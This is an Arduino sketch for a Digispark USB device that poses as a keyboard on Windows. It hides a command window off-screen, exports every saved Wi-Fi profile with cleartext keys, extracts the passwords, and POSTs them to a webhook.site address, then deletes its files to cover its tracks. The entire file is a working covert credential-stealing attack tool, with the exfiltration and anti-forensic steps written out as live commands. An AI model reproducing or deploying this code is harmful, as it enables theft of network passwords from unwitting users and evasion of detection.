
#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update(); // It is essential that DigiKeyboard.update() is called regularly (the beginning of the loop is good) to maintain USB communication. Using DigiKeyboard.delay() will automatically spam DigiKeyboard.update() calls during the delay period.
  DigiKeyboard.sendKeyStroke(0); // When digikeyboard first starts, it sometimes misses the first key press. Using DigiKeyboard.sendKeystroke(0) makes it send a key stroke that the computer won’t print.
  DigiKeyboard.delay(3000); // DigiKeyboard.delay() will allow the USB interface to enumerate, which is essential before you can communicate in any form over the interface.
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run opens...key = R....Modifier = windows key = MOD_GUI_LEFT
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible

  DigiKeyboard.delay(500); // delay needed for cursor to select the cmd window
  
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // Left Alt + Space activates the Menu of cmd window
  DigiKeyboard.sendKeyStroke(KEY_M); //Pressing M will help in getting to Move option of Menu of cmd window
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN); // It will drag cmd window down the taskbar
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling

  DigiKeyboard.delay(100);
  
  DigiKeyboard.println("cd %temp%"); //going to temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<your id> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);

  digitalWrite(1, HIGH); //turn on led when program finishes

  // After Our work is done..delay so doesn't go in loop
  DigiKeyboard.delay(90000); // have 90 seconds till LED will remain ON.
  digitalWrite(1, LOW); // Turn Off the LED
  DigiKeyboard.delay(8000); //again 8 sec delay
  
}
